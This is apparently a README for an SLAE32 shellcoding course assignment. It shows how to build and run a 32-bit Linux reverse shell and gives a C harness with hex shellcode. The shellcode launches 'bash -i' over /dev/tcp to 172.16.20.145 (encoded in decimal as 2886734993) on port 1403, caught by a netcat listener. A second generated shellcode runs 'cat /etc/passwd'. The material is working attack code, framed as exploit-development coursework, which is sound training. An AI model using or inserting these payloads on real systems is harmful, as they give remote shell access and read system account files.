Student ID: **SLAE-1530**

# SLAE32 Assignment 2 : Reverse Shell 

This repository is part of the SLAE32 Certification process.

## `execve.c`

local@user:$ `gcc execve.c -o execve`
local@user:# `nc -lvp 443`
local@user:$ `./execve`

## `execve-reverse-shell.masm`

local@user:$ `nasm -f elf32 -o execve-reverse-shell.o execve-reverse-shell.masm`
local@user:$ `ld -o execve-reverse-shell execve-reverse-shell.o`
local@user:# `nc -lvp 443`
local@user:$ `./execve-reverse-shell`

## `execve-reverse-shell-builder.py`

local@user:$ `chmod +x gen_revshell.py && ./gen_revshell.py 172.16.20.145 1403`

`````
#include<stdio.h>
#include<string.h>

// Shellcode size = 100
unsigned char code[] = \
        "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x69\x6e\x2f\x2f\x68\x2f\x2f"
        "\x2f\x62\x89\xe3\x66\xb8\x2d\x63\x50\x31\xc0\x89\xe2\x50\x68\x30"
        "\x3e\x26\x31\x68\x34\x30\x33\x20\x68\x39\x33\x2f\x31\x68\x37\x33"
        "\x34\x39\x68\x32\x38\x38\x36\x68\x74\x63\x70\x2f\x68\x64\x65\x76"
        "\x2f\x68\x69\x3e\x26\x2f\x68\x73\x68\x20\x2d\x68\x2a\x2f\x62\x61"
        "\x68\x2f\x2f\x2f\x2f\x89\xe6\x50\x56\x52\x53\x89\xe1\x50\x89\xe2"
        "\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
`````

user@local:$ `gcc shellcode.c -o shellcode -z execstack`
user@local:# `nc -lvp 443`
user@local:$ `./shellcode`

## `execve-builder.py`

user@local:$ `./execve-builder.py "/bin/cat /etc/passwd"`

``````
// Shellcode size = 70
unsigned char code[] = \
    "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x69\x6e\x2f\x2f\x68\x2f\x2f"
    "\x2f\x62\x89\xe3\x66\xb8\x2d\x63\x50\x31\xc0\x89\xe2\x50\x68\x73"
    "\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x20\x2f\x65\x74\x68\x2f\x63"
    "\x61\x74\x68\x2f\x62\x69\x6e\x89\xe6\x50\x56\x52\x53\x89\xe1\x50"
    "\x89\xe2\xb0\x0b\xcd\x80";
``````

